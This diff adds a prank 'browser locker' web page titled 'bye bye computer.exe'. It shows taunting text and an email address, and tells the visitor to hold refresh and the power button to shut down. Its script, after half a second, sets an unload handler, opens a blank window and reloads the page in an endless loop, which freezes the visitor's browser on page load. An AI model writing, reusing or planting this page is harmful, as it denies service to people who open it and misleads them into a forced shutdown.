@@ -1,0 +1,41 @@
+
+<!DOCTTYPE html>
+<html lang="en-US"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="profile" href="http://gmpg.org/xfn/11">
+<title>bye bye computer.exe</title>
+<meta name="robots" content="noindex, nofollow">
+<link rel="dns-prefetch" href="//fonts.googleapis.com">
+<link rel="dns-prefetch" href="//s.w.org">
+<link href="https://fonts.gstatic.com" crossorigin="" rel="preconnect">
+<link rel="stylesheet" id="twentyseventeen-fonts-css" href="https://fonts.googleapis.com/css?family=Libre+Franklin%3A300%2C300i%2C400%2C400i%2C600%2C600i%2C800%2C800i&amp;subset=latin%2Clatin-ext" type="text/css" media="all">
+<style type="text/css">
+h2{    
+    font-family: "Libre Franklin", "Helvetica Neue", helvetica, arial, sans-serif;
+    text-align: center;
+    margin-top: 256px;
+    font-size: 1.625rem;
+    font-weight: 300;
+    color: #666;
+    padding: 0;
+    line-height: 1.4;}
+</style>
+</head>
+<!--Code from https://github.com/ER332423/testsite/blob/main/test.html-->
+<body><h2>just kidding its back<br><br>This is never over<br><br>Email me at crash@computer4u.com<br><br>Press refresh and power button at the same time to shut down computer (which will fix what happened)</h2><body>
+   <body>
+      <script>var delayInMilliseconds = 500; //1 second
+
+setTimeout(function() {
+  //your code to be executed after 1 second
+  onbeforeunload = function(){localStorage.x=1};
+         
+         window.open("about:blank")
+
+         while(1)location.reload(1)
+}, delayInMilliseconds);
+         
+      </script>
+   </body>
+<html>
